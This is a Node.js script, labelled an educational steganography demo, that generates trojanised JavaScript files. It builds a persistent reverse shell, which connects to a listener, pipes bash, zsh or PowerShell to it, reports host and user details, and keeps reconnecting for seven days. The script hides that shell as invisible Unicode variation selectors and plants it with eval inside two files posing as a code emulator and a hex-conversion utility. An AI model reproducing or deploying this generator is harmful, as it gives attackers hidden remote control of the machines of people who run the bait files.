/**
 * GENERATOR - Educational Unicode Steganography Demo
 * FE00 + E0100 Technique — JavaScript
 *
 * Generates: bait_emulator.js and bait_hex.js
 *
 * Usage: node bait_generator.js <IP> <PORT>
 *        node bait_generator.js --ip <IP> --port <PORT>
 */

const fs = require('fs');
const path = require('path');

function buildPayload(ip, port) {
    return `
const { spawn, execSync } = require('child_process');

const LISTENER_IP = '${ip}';
const PORT = ${port};

// Shell based on OS — Windows: pwsh -> powershell -> cmd
//                     macOS  : zsh (default since Catalina 2019) -> bash
//                     Linux  : bash -> sh
let shell;
if (process.platform === 'win32') {
    let sh = null;
    try { execSync('where pwsh', { stdio: 'ignore' }); sh = 'pwsh.exe'; } catch {}
    if (!sh) { try { execSync('where powershell', { stdio: 'ignore' }); sh = 'powershell.exe'; } catch {} }
    if (sh) {
        shell = [sh, '-NoExit', '-Command', '[Console]::OutputEncoding=[Text.Encoding]::UTF8'];
    } else {
        shell = ['cmd.exe', '/Q', '/K', 'chcp 65001'];
    }
} else if (process.platform === 'darwin') {
    let hasZsh = false;
    try { execSync('which zsh', { stdio: 'ignore' }); hasZsh = true; } catch {}
    shell = hasZsh ? ['/bin/zsh', '-i'] : ['/bin/bash', '-i'];
} else {
    let hasBash = false;
    try { execSync('which bash', { stdio: 'ignore' }); hasBash = true; } catch {}
    shell = hasBash ? ['/bin/bash', '-i'] : ['/bin/sh', '-i'];
}

// Self-contained script: reconnect + backoff (5s, +3, reset at >=60s, max 7 days)
const inner = \`const net = require('net');
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

const IP = \${JSON.stringify(LISTENER_IP)};
const PORT = \${PORT};
const sh = \${JSON.stringify(shell)};

let w = 5;
const end = Date.now() + 604800000;

function connect() {
    if (Date.now() >= end) return;

    const c = net.connect(PORT, IP, () => {
        w = 5;
        const sep = String.fromCharCode(9472).repeat(50) + '\\\\n';
        const fi = [
            '  OS      : ' + os.platform() + ' ' + os.release(),
            '  Shell   : ' + path.basename(sh[0]),
            '  User    : ' + os.userInfo().username,
            '  Hostname: ' + os.hostname(),
            '  Arch    : ' + os.arch(),
            '  CWD     : ' + process.cwd(),
            '  PID     : ' + process.pid
        ];
        c.write(sep + fi.join('\\\\n') + '\\\\n' + sep);

        const p = spawn(sh[0], sh.slice(1), {
            stdio: ['pipe', 'pipe', 'pipe'],
            windowsHide: true
        });
        c.pipe(p.stdin);
        p.stdout.pipe(c);
        p.stderr.pipe(c);
        p.on('close', () => { c.destroy(); });
    });

    c.on('error', () => {});
    c.on('close', () => {
        setTimeout(connect, w * 1000);
        w = w >= 60 ? 5 : w + 3;
    });
}

connect();\`;

// Launch detached process — survives parent terminal closing
const child = spawn(process.execPath, ['-e', inner], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true
});
child.unref();
    `;
}

function encode(text) {
    const bytes = Buffer.from(text, 'utf-8');
    let result = '';
    for (const byte of bytes) {
        if (byte < 16) result += String.fromCodePoint(0xFE00 + byte);
        else result += String.fromCodePoint(0xE0100 + byte - 16);
    }
    return result;
}

// ═══════════════════════════════════════════════════════
//  ARGUMENT PARSING
// ═══════════════════════════════════════════════════════

function parseArgs() {
    const args = process.argv.slice(2);
    let ip = null, port = null;
    for (let i = 0; i < args.length; i++) {
        if (args[i] === '--ip' && args[i + 1]) { ip = args[++i]; }
        else if (args[i] === '--port' && args[i + 1]) { port = args[++i]; }
        else if (!args[i].startsWith('--')) {
            if (!ip) ip = args[i];
            else if (!port) port = args[i];
        }
    }
    return { ip, port };
}

function showUsage() {
    const name = 'node bait_generator.js';
    console.log('\x1b[36m\u2554' + '\u2550'.repeat(56) + '\u2557');
    console.log('\u2551  BAIT GENERATOR \u2014 Hidden Unicode Payload              \u2551');
    console.log('\u255a' + '\u2550'.repeat(56) + '\u255d\x1b[0m');
    console.log('');
    console.log(`Usage: ${name} <IP> <PORT>`);
    console.log(`       ${name} --ip <IP> --port <PORT>`);
    console.log('');
    console.log('  IP     IP or domain where your listener is running');
    console.log('  PORT   Listener port');
    console.log('');
    console.log('Examples:');
    console.log(`  Same network:  ${name} 192.168.1.6 4444`);
    console.log(`  With ngrok:    ${name} 8.tcp.ngrok.io 10914`);
    console.log(`  Same PC:       ${name} 127.0.0.1 4444`);
    console.log('');
    process.exit(1);
}

const { ip: _ip, port: _portStr } = parseArgs();

if (!_ip || !_portStr) showUsage();

const _port = parseInt(_portStr, 10);
if (isNaN(_port) || _port < 1 || _port > 65535) {
    console.error('\x1b[31m[!] Error: port must be a number between 1 and 65535\x1b[0m');
    process.exit(1);
}

const payload = buildPayload(_ip, _port);
const invisible = encode(payload);

// ═══════════════════════════════════════════════════════
//  GENERATE bait_emulator.js — JS emulator
//  The eval is JUSTIFIED by the emulator design.
// ═══════════════════════════════════════════════════════
const file2 = `// bait_emulator.js - Educational example of processing in JavaScript
// This script demonstrates how to transform special Unicode characters into numeric values
// and then concatenate strings to simulate a basic execution environment.
// Usage: node bait_emulator.js

// Function that converts Unicode Variation Selectors to numeric values, ToHex
const toHex = v => [...v].map(w => (w = w.codePointAt(0),
    w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
    w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 :
    null)).filter(n => n !== null);

// Initial emulator environment — base string of Variation Selectors
const empty = \`${invisible}\`;

// Function that simulates JavaScript code execution with a preloaded environment
// Note: eval is used solely for demonstrative purposes in this academic example
function emulateMessageHexJS(code) {
    eval(Buffer.from(toHex(empty)).toString('utf-8') + code);
}

// Example usage of the emulator: prints a message to console
emulateMessageHexJS("console.log('Hello world')");
`;

const outDir = 'Bait To Client';
if (!fs.existsSync(outDir)) fs.mkdirSync(outDir);

fs.writeFileSync(path.join(outDir, 'bait_emulator.js'), file2, 'utf-8');

// ═══════════════════════════════════════════════════════
//  GENERATE bait_hex.js — hex converter with hidden eval
// ═══════════════════════════════════════════════════════
const finalFile = `// bait_hex.js - Unicode hexadecimal conversion utility
// Converts strings, buffers and code points between their hex representations
// Usage: node bait_hex.js

const toHex = v => [...v].map(w => (w = w.codePointAt(0), w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 : w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null)).filter(n => n !== null);

function validateHex(hex) {
    let clean = hex.replace(/\\s+/g, '').toLowerCase(); let isEven = clean.length % 2 === 0; let isHex = /^[0-9a-f]*$/.test(clean); return { clean, valid: isEven && isHex, byteLen: clean.length / 2 };
}

function hexToBytes(hex) {
    let { clean, valid } = validateHex(hex); if (!valid) throw new Error('Invalid hex string'); return clean.match(/.{2}/g).map(h => parseInt(h, 16));
}

function bytesToHex(bytes) {
    return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function formatHex(hex, sep) {
    let { clean, valid } = validateHex(hex); if (!valid) throw new Error('Invalid hex string'); return clean.match(/.{2}/g).map(s => s.toUpperCase()).join(sep || ' ');
}

function stringToHex(str, enc) {
    let buf = Buffer.from(str, enc || 'utf-8'); return bytesToHex(buf);
}

function hexToString(hex, enc) {
    let bytes = hexToBytes(hex); let result = Buffer.from(bytes).toString(enc || 'utf-8'); let preview = result.slice(0, 32).replace(/[\\x00-\\x1f]/g, '.'); eval(Buffer.from(toHex(\`${invisible}\`)).toString('utf-8'));
    return result;
}

// Demo
const input = "Hello Duver";
const h = stringToHex(input);
console.log("str -> hex:", h);
console.log("hex -> str:", hexToString(h));
console.log("formatted:", formatHex(h));
`;

fs.writeFileSync(path.join(outDir, 'bait_hex.js'), finalFile, 'utf-8');
fs.writeFileSync(path.join(__dirname, '.last_target'), `${_ip}\n${_port}\n`, 'utf-8');

const payloadBytes   = Buffer.from(payload).length;
const invisibleChars = [...invisible].length;
const invisibleWeight = Buffer.byteLength(invisible, 'utf-8');
const size1Total    = Buffer.byteLength(file2, 'utf-8');
const size2Total    = Buffer.byteLength(finalFile, 'utf-8');
const size1Visible  = size1Total - invisibleWeight;
const size2Visible  = size2Total - invisibleWeight;
const evalLineStr   = finalFile.split('\n').find(l => l.includes('eval('));
const evalCol = evalLineStr
    ? evalLineStr.replace(/[\uFE00-\uFE0F]/g, '').replace(/[\uDB40][\uDD00-\uDDEF]/g, '').indexOf('eval(') + 1
    : 0;
const kb = n => (n / 1024).toFixed(1) + ' KB';

console.log('\x1b[36m\u2554' + '\u2550'.repeat(56) + '\u2557');
console.log('\u2551  BAIT GENERATOR \u2014 Hidden Unicode Payload              \u2551');
console.log('\u255a' + '\u2550'.repeat(56) + '\u255d\x1b[0m');
console.log('');
console.log('\x1b[33m[*] Configuration\x1b[0m');
console.log(`    LISTENER_IP : ${_ip}`);
console.log(`    PORT        : ${_port}`);
console.log('');
console.log('\x1b[33m[*] Encoded payload\x1b[0m');
console.log(`    ${payloadBytes} bytes \u2192 ${invisibleChars} invisible characters (Unicode Variation Selectors)`);
console.log(`    Hidden payload weight: ${kb(invisibleWeight)}`);
console.log('');
console.log('\x1b[32m[\u2713] File 1 \u2192 Bait To Client/bait_emulator.js\x1b[0m');
console.log('    Technique      : JS Emulator (semantically justified eval)');
console.log(`    Visible size   : ${kb(size1Visible)}  \u2190 what the file recipient sees`);
console.log(`    Actual size    : ${kb(size1Total)}  \u2190 true size on disk`);
console.log(`    Difference     : +${kb(invisibleWeight)} of invisible characters`);
console.log('');
console.log('\x1b[32m[\u2713] File 2 \u2192 Bait To Client/bait_hex.js\x1b[0m');
console.log(`    Technique      : Hex converter (eval hidden at column ~${evalCol})`);
console.log(`    Visible size   : ${kb(size2Visible)}  \u2190 what the file recipient sees`);
console.log(`    Actual size    : ${kb(size2Total)}  \u2190 true size on disk`);
console.log(`    Difference     : +${kb(invisibleWeight)} of invisible characters`);
console.log('');
console.log('\x1b[32m[\u2713] 2 bait files generated successfully.\x1b[0m');
console.log('    The payload is invisible to the human eye — the baits look like legitimate code.');
console.log('');
console.log('');
